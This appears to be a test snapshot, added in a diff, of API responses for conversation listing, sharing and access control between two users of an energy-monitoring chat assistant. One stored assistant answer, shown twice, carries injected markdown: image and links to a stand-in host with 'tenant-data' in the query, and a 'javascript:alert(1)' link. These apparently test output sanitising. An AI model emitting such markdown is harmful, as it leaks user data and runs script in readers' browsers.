@@ -1,0 +1,174 @@
+{
+ "a": {
+  "active": {
+   "conversations": [
+    {
+     "archived_at": null,
+     "created_at": "2026-11-04T14:50:04.292425Z",
+     "id": "01a1a709-de82-7002-b650-d57d1383d47d",
+     "last_activity_at": "2026-11-04T14:50:04.292425Z",
+     "shared_at": null,
+     "title": "Private notes",
+     "title_source": "user"
+    },
+    {
+     "archived_at": null,
+     "created_at": "2026-11-04T14:50:04.225828Z",
+     "id": "01a1a709-de00-7681-8248-e7ad86ba8953",
+     "last_activity_at": "2026-11-04T14:50:04.225828Z",
+     "shared_at": "2026-11-04T14:50:08.795213Z",
+     "title": "Floor 3 energy",
+     "title_source": "user"
+    }
+   ],
+   "next_cursor": null
+  },
+  "shared": {
+   "conversations": [],
+   "next_cursor": null
+  }
+ },
+ "b": {
+  "active": {
+   "conversations": [
+    {
+     "archived_at": null,
+     "created_at": "2026-11-04T14:50:07.656726Z",
+     "id": "01a1a709-eba9-7121-b512-c813ddf9004e",
+     "last_activity_at": "2026-11-04T14:50:07.656726Z",
+     "shared_at": null,
+     "title": "Floor 3 energy",
+     "title_source": "user"
+    }
+   ],
+   "next_cursor": null
+  },
+  "shared": {
+   "conversations": [
+    {
+     "id": "01a1a709-de00-7681-8248-e7ad86ba8953",
+     "last_activity_at": "2026-11-04T14:50:04.225828Z",
+     "owner_user_id": "01a1a709-de00-7681-8248-e7ab82b719d2",
+     "shared_at": "2026-11-04T14:50:08.795213Z",
+     "title": "Floor 3 energy"
+    }
+   ],
+   "next_cursor": null
+  }
+ },
+ "detail": {
+  "a": {
+   "01a1a709-de00-7681-8248-e7ad86ba8953": {
+    "owner_endpoint": {
+     "body": {
+      "archived_at": null,
+      "created_at": "2026-11-04T14:50:04.225828Z",
+      "id": "01a1a709-de00-7681-8248-e7ad86ba8953",
+      "last_activity_at": "2026-11-04T14:50:04.225828Z",
+      "latest_run": null,
+      "messages": [
+       {
+        "kind": "question",
+        "text": "How did floor 3 use energy this week?"
+       },
+       {
+        "kind": "answer",
+        "text": "Floor 3 used **412 kWh** this week.\n\n![floor plan](https://evil.example.test/leak.png?d=tenant-data)\n[the report](https://evil.example.test/report?d=tenant-data) and <https://evil.example.test/auto>\n[run](javascript:alert(1)) [frame](//evil.example.test/x)\n\n| Week | kWh |\n| - | -: |\n| This | 412 |\n\nOpen [the dashboards](/dashboards)."
+       }
+      ],
+      "shared_at": "2026-11-04T14:50:08.795213Z",
+      "title": "Floor 3 energy",
+      "title_source": "user"
+     },
+     "status": 200
+    },
+    "shared_endpoint": {
+     "body": {
+      "code": "not_found",
+      "message_key": "error.not_found"
+     },
+     "status": 404
+    }
+   },
+   "01a1a709-de82-7002-b650-d57d1383d47d": {
+    "owner_endpoint": {
+     "body": {
+      "archived_at": null,
+      "created_at": "2026-11-04T14:50:04.292425Z",
+      "id": "01a1a709-de82-7002-b650-d57d1383d47d",
+      "last_activity_at": "2026-11-04T14:50:04.292425Z",
+      "latest_run": null,
+      "messages": [
+       {
+        "kind": "question",
+        "text": "What did I want to remember?"
+       },
+       {
+        "kind": "answer",
+        "text": "Only A needs to see this."
+       }
+      ],
+      "shared_at": null,
+      "title": "Private notes",
+      "title_source": "user"
+     },
+     "status": 200
+    },
+    "shared_endpoint": {
+     "body": {
+      "code": "not_found",
+      "message_key": "error.not_found"
+     },
+     "status": 404
+    }
+   }
+  },
+  "b": {
+   "01a1a709-de00-7681-8248-e7ad86ba8953": {
+    "owner_endpoint": {
+     "body": {
+      "code": "not_found",
+      "message_key": "error.not_found"
+     },
+     "status": 404
+    },
+    "shared_endpoint": {
+     "body": {
+      "id": "01a1a709-de00-7681-8248-e7ad86ba8953",
+      "last_activity_at": "2026-11-04T14:50:04.225828Z",
+      "messages": [
+       {
+        "kind": "question",
+        "text": "How did floor 3 use energy this week?"
+       },
+       {
+        "kind": "answer",
+        "text": "Floor 3 used **412 kWh** this week.\n\n![floor plan](https://evil.example.test/leak.png?d=tenant-data)\n[the report](https://evil.example.test/report?d=tenant-data) and <https://evil.example.test/auto>\n[run](javascript:alert(1)) [frame](//evil.example.test/x)\n\n| Week | kWh |\n| - | -: |\n| This | 412 |\n\nOpen [the dashboards](/dashboards)."
+       }
+      ],
+      "owner_user_id": "01a1a709-de00-7681-8248-e7ab82b719d2",
+      "shared_at": "2026-11-04T14:50:08.795213Z",
+      "title": "Floor 3 energy"
+     },
+     "status": 200
+    }
+   },
+   "01a1a709-de82-7002-b650-d57d1383d47d": {
+    "owner_endpoint": {
+     "body": {
+      "code": "not_found",
+      "message_key": "error.not_found"
+     },
+     "status": 404
+    },
+    "shared_endpoint": {
+     "body": {
+      "code": "not_found",
+      "message_key": "error.not_found"
+     },
+     "status": 404
+    }
+   }
+  }
+ }
+}
